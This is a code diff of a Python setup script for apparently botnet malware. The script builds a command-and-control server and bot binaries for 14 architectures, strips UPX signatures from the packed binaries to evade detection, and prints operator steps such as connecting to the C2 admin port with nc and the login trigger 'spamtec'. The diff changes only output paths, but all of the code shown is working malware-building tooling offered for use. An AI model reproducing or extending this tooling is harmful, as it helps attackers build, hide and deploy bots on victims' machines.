@@ -485,10 +485,10 @@ def build_cnc(cnc_path: str) -> bool:
         return False
 
 
-def build_bots(bot_path: str) -> bool:
-    """Build bot binaries using build.sh"""
+def build_bots(base_path: str) -> bool:
+    """Build bot binaries using build.sh from project root"""
     try:
-        build_script = os.path.join(bot_path, "build.sh")
+        build_script = os.path.join(base_path, "build.sh")
 
         # Make build.sh executable
         os.chmod(build_script, 0o755)
@@ -497,7 +497,7 @@ def build_bots(bot_path: str) -> bool:
         info("This may take a few minutes...")
         print()
 
-        result = subprocess.run(["bash", "build.sh"], cwd=bot_path, text=True)
+        result = subprocess.run(["bash", "build.sh"], cwd=base_path, text=True)
 
         return result.returncode == 0
     except Exception as e:
@@ -505,11 +505,11 @@ def build_bots(bot_path: str) -> bool:
         return False
 
 
-def deupx_binaries(bot_path: str) -> bool:
+def deupx_binaries(base_path: str, bot_path: str) -> bool:
     """Strip UPX signatures from packed binaries using deUPX.py"""
     try:
         deupx_script = os.path.join(bot_path, "deUPX.py")
-        bins_dir = os.path.join(bot_path, "bins")
+        bins_dir = os.path.join(base_path, "bins")
 
         if not os.path.exists(deupx_script):
             warning(f"deUPX.py not found at {deupx_script}")
@@ -521,7 +521,7 @@ def deupx_binaries(bot_path: str) -> bool:
 
         info("Stripping UPX signatures from packed binaries...")
         result = subprocess.run(
-            [sys.executable, deupx_script, bins_dir], cwd=bot_path, text=True
+            [sys.executable, deupx_script, bins_dir], cwd=base_path, text=True
         )
 
         return result.returncode == 0
@@ -565,7 +565,7 @@ def save_config(base_path: str, config: dict):
             f"2. Connect Admin(multi user mode): nc {config['c2_address'].split(':')[0]} {config['admin_port']}\n"
         )
         f.write("3. Login trigger(multi user mode): spamtec\n")
-        f.write("4. Bot binaries: bot/bins/\n")
+        f.write("4. Bot binaries: bins/\n")
 
     return config_path
 
@@ -596,7 +596,7 @@ def print_summary(config: dict):
     admin_port = config.get("admin_port", "420")
     print(f"    2. Connect:      {Colors.GREEN}nc {c2_ip} {admin_port}{Colors.RESET}")
     print(f"    3. Login:        {Colors.GREEN}spamtec{Colors.RESET}")
-    print(f"    4. Bot bins:     {Colors.GREEN}bot/bins/{Colors.RESET}")
+    print(f"    4. Bot bins:     {Colors.GREEN}bins/{Colors.RESET}")
     print()
 
 
@@ -851,10 +851,10 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     if confirm(
         "Would you like to build bot binaries? (14 architectures, takes a few mins)"
     ):
-        if build_bots(bot_path):
+        if build_bots(base_path):
             success("Bot binaries built")
         else:
-            warning("Bot build had issues - check bot/bins/")
+            warning("Bot build had issues - check bins/")
 
     # Save config
     config_file = save_config(base_path, config)
@@ -957,10 +957,10 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         warning("Failed to set debug mode")
 
     if confirm("Would you like to build bot binaries? (takes a few mins)"):
-        if build_bots(bot_path):
+        if build_bots(base_path):
             success("Bot binaries built")
         else:
-            warning("Bot build had issues - check bot/bins/")
+            warning("Bot build had issues - check bins/")
 
     # Summary
     print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
@@ -979,7 +979,7 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
     )
     print()
-    warning("Deploy new bot binaries from bot/bins/")
+    warning("Deploy new bot binaries from bins/")
     warning("Existing bots will NOT auto-update - redeploy required")
     print()
 
